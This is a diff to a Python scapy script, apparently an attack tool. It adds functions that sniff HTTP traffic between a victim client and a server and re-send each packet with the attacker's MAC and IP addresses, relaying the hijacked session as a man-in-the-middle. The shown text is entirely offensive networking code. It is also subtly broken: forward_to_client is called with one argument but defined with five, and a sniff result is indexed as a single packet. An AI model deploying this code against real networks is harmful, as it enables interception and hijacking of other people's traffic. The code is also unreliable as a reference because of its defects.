@@ -170,6 +170,57 @@ def is_victim_ack(pkt, victimIP, attackerIP):
         and pkt[sc.TCP].flags == "A"
     )
 
+## forwarding method
+def own_server(clientIP, serverIP, serverMac, attackerMac, attackerIP):
+    while (True):
+        nxt_pkt = sc.sniff(filter="http")
+        if (nxt_pkt[sc.IP].src == clientIP):
+            forward_to_server(nxt_pkt, attackerMac, attackerIP, serverMac, serverIP)
+            if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
+                return
+        if (nxt_pkt[sc.IP].src == serverIP):
+            forward_to_client(nxt_pkt)
+            if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
+                return
+
+def is_rst(pkt):
+    return sc.TCP in pkt and 'R' in pkt[sc.TCP].flags
+
+def is_tcp_fin(pkt):
+    return sc.TCP in pkt and 'F' in pkt[sc.TCP].flags
 
     
+def forward_to_server(pkt, attackerMac, attackerIP, serverMac, serverIP):
+    ether = sc.Ether(src=attackerMac, dst=serverMac)
+    ip = sc.IP(src=attackerIP, dst=serverIP)
+    tcp = sc.TCP(
+        sport=pkt[sc.TCP].sport,
+        dport=pkt[sc.TCP].dport,
+        seq=pkt[sc.TCP].seq,
+        ack=pkt[sc.TCP].ack,
+        flags=pkt[sc.TCP].flags
+    )
+    if pkt.haslayer(sc.Raw):
+        raw = sc.Raw(load=pkt[sc.Raw].load)
+        new_pkt = ether / ip / tcp / raw
+    else:
+        new_pkt = ether / ip / tcp
+    sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)
 
+
+def forward_to_client(pkt, attackerMac, attackerIP, victimMac, victimIP):
+    ether = sc.Ether(src=attackerMac, dst=victimMac)
+    ip = sc.IP(src=attackerIP, dst=victimIP)
+    tcp = sc.TCP(
+        sport=pkt[sc.TCP].sport,
+        dport=pkt[sc.TCP].dport,
+        seq=pkt[sc.TCP].seq,
+        ack=pkt[sc.TCP].ack,
+        flags=pkt[sc.TCP].flags
+    )
+    if pkt.haslayer(sc.Raw):
+        raw = sc.Raw(load=pkt[sc.Raw].load)
+        new_pkt = ether / ip / tcp / raw
+    else:
+        new_pkt = ether / ip / tcp
+    sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)
